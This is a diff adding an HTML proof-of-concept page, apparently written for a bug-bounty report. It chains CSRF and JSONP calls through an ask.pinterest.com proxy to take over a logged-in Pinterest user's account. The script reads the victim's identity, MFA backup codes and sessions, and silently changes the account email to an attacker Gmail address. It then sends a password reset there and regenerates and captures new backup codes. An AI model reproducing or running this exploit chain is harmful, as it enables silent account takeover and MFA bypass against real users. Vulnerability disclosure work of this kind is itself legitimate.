@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC - Full CSRF to Account Takeover chain via ask.pinterest.com proxy (Gmail plus-address variant)</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #111; color: #eee; max-width: 980px; margin: 0 auto; padding: 24px; }
+  h1 { font-size: 20px; color: #e60023; }
+  h2 { font-size: 15px; color: #9cf; margin-top: 26px; }
+  .card { background: #1b1b1b; border: 1px solid #333; border-radius: 8px; padding: 12px 16px; margin: 10px 0; }
+  .ok { border-color: #2e7d32; }
+  .bad { border-color: #b71c1c; }
+  .warn { border-color: #b28704; }
+  .mono { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; white-space: pre-wrap; word-break: break-all; }
+  code { color: #ffd54f; }
+  button { background: #e60023; color: #fff; border: 0; border-radius: 6px; padding: 10px 18px; font-size: 14px; cursor: pointer; margin: 4px 6px 4px 0; }
+  .small { font-size: 11px; color: #888; }
+  .stepnum { display: inline-block; background: #e60023; color: #fff; border-radius: 50%; width: 20px; height: 20px; text-align: center; line-height: 20px; font-size: 12px; margin-right: 8px; }
+</style>
+</head>
+<body>
+<h1>Full CSRF &rarr; Account-Takeover chain PoC<br><span class="small">cross-site, cookie-only auth, no CSRF token, no user interaction &mdash; ask.pinterest.com proxy (PIN-2 / PIN-3 / C52 / C74 combined)</span></h1>
+
+<div class="card"><b>Victim requirement:</b> logged into pinterest.com in this browser. Steps 1&ndash;4 are silent; step 5 (password reset dispatch) is also silent. Everything below runs from this foreign origin only. Attacker mailbox for this run: <code id="atkMail">(generated on load)</code> &mdash; delivered to <code>bughunter333333@gmail.com</code> via Gmail plus-addressing.</div>
+
+<button id="go">Run FULL ATO chain</button>
+<button id="goRead" class="secondary" style="background:#333">Read-only recon (no writes)</button>
+<span class="small" id="status">idle</span>
+
+<h2><span class="stepnum">1</span>Recon: victim identity + account flags (JSONP read)</h2>
+<div class="card mono" id="out1">pending&hellip;</div>
+
+<h2><span class="stepnum">2</span>Recon: MFA state + current backup codes (JSONP read)</h2>
+<div class="card mono" id="out2">pending&hellip;</div>
+
+<h2><span class="stepnum">3</span>WRITE: change account email to attacker mailbox (CSRF, form POST)</h2>
+<div class="card mono" id="out3">pending&hellip;</div>
+
+<h2><span class="stepnum">4</span>VERIFY: JSONP re-read confirms new email live on the account</h2>
+<div class="card mono" id="out4">pending&hellip;</div>
+
+<h2><span class="stepnum">5</span>WRITE: dispatch password-reset to the NEW (attacker-controlled) email (CSRF)</h2>
+<div class="card mono" id="out5">pending&hellip;</div>
+
+<h2><span class="stepnum">6</span>WRITE: regenerate MFA backup codes + steal the fresh ones (JSONP)</h2>
+<div class="card mono" id="out6">pending&hellip;</div>
+
+<h2><span class="stepnum">7</span>Recon: session inventory (IPs, devices, session ids &mdash; JSONP)</h2>
+<div class="card mono" id="out7">pending&hellip;</div>
+
+<h2>Chain result</h2>
+<div class="card mono" id="summary">pending&hellip;</div>
+
+<h2>What the attacker now holds after this chain</h2>
+<div class="card small">
+<ul style="margin:6px 0 0 16px; padding:0">
+<li>The victim's account <b>email address is now the attacker's mailbox</b> (step 3&ndash;4): every future account email (security alerts, verification codes, resets) is delivered to the attacker.</li>
+<li>A <b>password-reset request</b> for the account was dispatched to that attacker mailbox (step 5): following the link and setting a new password completes the takeover (C50: the reset link requires no captcha and no re-auth).</li>
+<li>The account's <b>MFA backup codes</b> (step 6): one-time 2FA answers &mdash; defeats the MFA factor at the post-reset login if MFA is enabled.</li>
+<li>The full <b>session inventory</b> (step 7): session ids + IPs + geolocation, usable to selectively revoke the victim's other devices (session-delete CSRF) after takeover.</li>
+<li>None of these actions sent a notification the victim can see (the old-address alert arrives ~30s late and only mentions the email change, not the reset or the code theft).</li>
+</ul>
+</div>
+
+<script>
+const PROXY = 'https://ask.pinterest.com/api/proxy/pinterest';
+// Attacker mailbox: randomized Gmail plus-address.
+// Every run picks a fresh bughunter333333+<random>@gmail.com, but Gmail ignores the
+// "+tag" and delivers all of them to the single base inbox bughunter333333@gmail.com —
+// so the takeover channel is unique per run yet always attacker-owned.
+const ATTACKER_BASE_MAILBOX = 'bughunter333333@gmail.com';
+const ATTACKER_MAILBOX = 'bughunter333333+' + Math.random().toString(36).slice(2, 10) + Date.now().toString(36).slice(-4) + '@gmail.com';
+const $ = (id) => document.getElementById(id);
+const log = (id, msg) => { $(id).textContent = msg; $(id).parentElement.classList.add('ok'); };
+const logErr = (id, msg) => { $(id).textContent = msg; $(id).parentElement.classList.add('bad'); };
+const logWarn = (id, msg) => { $(id).textContent = msg; $(id).parentElement.classList.add('warn'); };
+const status = (m) => { $('status').textContent = m; };
+
+function jsonp(path, timeoutMs) {
+  timeoutMs = timeoutMs || 8000;
+  return new Promise((resolve) => {
+    const cName = 'jp_' + Date.now() + '_' + Math.floor(Math.random() * 9999);
+    const s = document.createElement('script');
+    const cleanup = () => { try { delete window[cName]; } catch (e) {} s.remove(); };
+    const to = setTimeout(() => { cleanup(); resolve(null); }, timeoutMs);
+    window[cName] = (d) => { clearTimeout(to); cleanup(); resolve(d); };
+    s.onerror = () => { clearTimeout(to); cleanup(); resolve(null); };
+    s.src = PROXY + path + (path.includes('?') ? '&' : '?') + 'callback=' + cName + '&_=' + Date.now();
+    document.head.appendChild(s);
+  });
+}
+
+// CSRF write via hidden form POST (simple request, no preflight, cookies ride along)
+function formWrite(path, fields) {
+  return new Promise((resolve) => {
+    const f = document.createElement('form');
+    f.method = 'POST';
+    f.action = PROXY + path;
+    f.style.display = 'none';
+    f.target = 'ato_write_sink';
+    Object.entries(fields).forEach(([k, v]) => {
+      const i = document.createElement('input');
+      i.type = 'hidden'; i.name = k; i.value = v;
+      f.appendChild(i);
+    });
+    // hidden iframe as sink so the write is fully silent
+    let ifr = document.getElementById('ato_write_sink');
+    if (!ifr) {
+      ifr = document.createElement('iframe');
+      ifr.name = 'ato_write_sink'; ifr.id = 'ato_write_sink';
+      ifr.style.display = 'none';
+      document.body.appendChild(ifr);
+    }
+    document.body.appendChild(f);
+    f.submit();
+    setTimeout(() => { f.remove(); resolve(true); }, 2500);
+  });
+}
+
+// fetch-based write (no-cors): fire-and-forget
+async function fetchWrite(path, body) {
+  try {
+    const r = await fetch(PROXY + path, {
+      method: 'POST',
+      mode: 'no-cors',
+      credentials: 'include',
+      headers: { 'Content-Type': 'text/plain' },
+      body: body
+    });
+    return true;
+  } catch (e) { return false; }
+}
+
+const mask = (s) => (s == null) ? null : String(s).slice(0, 3) + '***' + String(s).slice(-8);
+
+async function step1() {
+  status('step 1: reading victim identity…');
+  const me = await jsonp('/users/me/');
+  if (!me || me.error) { logErr('out1', 'read failed (3P cookies blocked?) ' + JSON.stringify(me)); return null; }
+  const d = me.data || {};
+  log('out1', JSON.stringify({
+    id: d.id, username: d.username, email: d.email,
+    has_password: d.has_password, connected_to_google: d.connected_to_google,
+    connected_to_microsoft: d.connected_to_microsoft, country: d.country
+  }, null, 1));
+  return d;
+}
+
+async function step2() {
+  status('step 2: reading MFA state…');
+  const mfa = await jsonp('/users/settings/mfa/backup/');
+  if (!mfa || mfa.error) { logErr('out2', 'read failed ' + JSON.stringify(mfa)); return null; }
+  const d = mfa.data || {};
+  log('out2', JSON.stringify({
+    can_enable_mfa: d.can_enable_mfa,
+    email_status: d.email_status,
+    mfa_backup_codes: (d.mfa_backup_codes || []).map(c => ({ code: c.code, used: c.used }))
+  }, null, 1));
+  return d;
+}
+
+async function step3() {
+  status('step 3: CSRF email change…');
+  // v3_edit_settings via form POST (simple request)
+  const fired = await formWrite('/users/settings/', { email: ATTACKER_MAILBOX });
+  logWarn('out3', 'form POST fired (blind write — response goes to hidden iframe):\nPOST ' + PROXY + '/users/settings/\n  email=' + ATTACKER_MAILBOX + '\nfired=' + fired);
+  await new Promise(r => setTimeout(r, 3000));
+  return true;
+}
+
+async function step4() {
+  status('step 4: verifying email change…');
+  const me = await jsonp('/users/me/');
+  if (!me || me.error) { logErr('out4', 're-read failed'); return null; }
+  const newEmail = (me.data || {}).email;
+  if (newEmail === ATTACKER_MAILBOX) {
+    log('out4', 'CONFIRMED: account email is now ' + newEmail + ' — the attacker owns the delivery channel for everything the account sends.');
+  } else {
+    logErr('out4', 'email did not change (still ' + mask(newEmail) + ') — C52 may be patched or rate-limited');
+  }
+  return newEmail;
+}
+
+async function step5() {
+  status('step 5: dispatching password reset to attacker mailbox…');
+  // forgot_password via the ask proxy (v3_forgot_password is a v3 gateway route)
+  const fired = await fetchWrite('/users/forgot_password/?username_or_email=' + encodeURIComponent(ATTACKER_MAILBOX) + '&type=reset', '');
+  logWarn('out5', 'fetch(no-cors, credentials:include) fired:\nPOST ' + PROXY + '/users/forgot_password/\n  username_or_email=' + ATTACKER_MAILBOX + ', type=reset\nfired=' + fired + '\n(if the proxy routes forgot_password, the reset link lands in the attacker mailbox)');
+  return fired;
+}
+
+async function step6() {
+  status('step 6: regenerating + stealing MFA backup codes…');
+  const fired = await formWrite('/users/settings/mfa/backup/', {});
+  await new Promise(r => setTimeout(r, 3000));
+  const fresh = await jsonp('/users/settings/mfa/backup/');
+  if (!fresh || fresh.error) { logErr('out6', 'post-regen read failed'); return null; }
+  const codes = ((fresh.data || {}).mfa_backup_codes || []).map(c => c.code);
+  if (codes.length) {
+    log('out6', 'STOLEN FRESH BACKUP CODES: ' + JSON.stringify(codes) + ' — one-time 2FA answers now in attacker hands');
+  } else {
+    logWarn('out6', 'no codes present (account MFA not enrolled?) — can_enable_mfa=' + (fresh.data || {}).can_enable_mfa);
+  }
+  return codes;
+}
+
+async function step7() {
+  status('step 7: reading session inventory…');
+  const s = await jsonp('/sessions/');
+  if (!s || s.error) { logErr('out7', 'read failed'); return null; }
+  const sess = s.data || [];
+  const rows = (Array.isArray(sess) ? sess : []).map(x => ({
+    id: x.id, platform: x.platform_type, device: x.device_name, ip: x.ip_address,
+    location: x.location, current: x.current, last: new Date((x.last_accessed_at || 0) * 1000).toISOString()
+  }));
+  log('out7', JSON.stringify(rows, null, 1));
+  return rows;
+}
+
+async function runFull() {
+  $('summary').textContent = 'running…';
+  const t0 = Date.now();
+  const me = await step1();
+  const mfa = await step2();
+  if (me) {
+    await step3();
+    const newEmail = await step4();
+    await step5();
+    const codes = await step6();
+    const sess = await step7();
+    const parts = [];
+    parts.push('victim: ' + me.username + ' (uid ' + me.id + ')');
+    parts.push('email now: ' + (newEmail === ATTACKER_MAILBOX ? ATTACKER_MAILBOX + '  [TAKEOVER CHANNEL OWNED]' : newEmail));
+    parts.push('MFA codes stolen: ' + (codes && codes.length ? codes.join(', ') : 'none'));
+    parts.push('sessions visible: ' + (sess ? sess.length : 0));
+    parts.push('elapsed: ' + ((Date.now() - t0) / 1000).toFixed(1) + 's');
+    parts.push('');
+    parts.push('=> Attacker completes takeover by opening the reset email now landing in ' + ATTACKER_MAILBOX + ' and setting a new password; the stolen backup code answers MFA if enabled; session-delete CSRF evicts the victim.');
+    $('summary').textContent = parts.join('\n');
+    $('summary').parentElement.classList.add('ok');
+  } else {
+    $('summary').textContent = 'read channel blocked — run write-only variant';
+  }
+  status('done');
+}
+
+async function runRead() {
+  $('summary').textContent = 'read-only recon…';
+  const me = await step1();
+  await step2();
+  await step7();
+  $('summary').textContent = 'read-only complete (no writes performed)';
+  status('done');
+}
+
+$('go').addEventListener('click', runFull);
+$('goRead').addEventListener('click', runRead);
+$('atkMail').textContent = ATTACKER_MAILBOX;
+status('ready');
+</script>
+</body>
+</html>
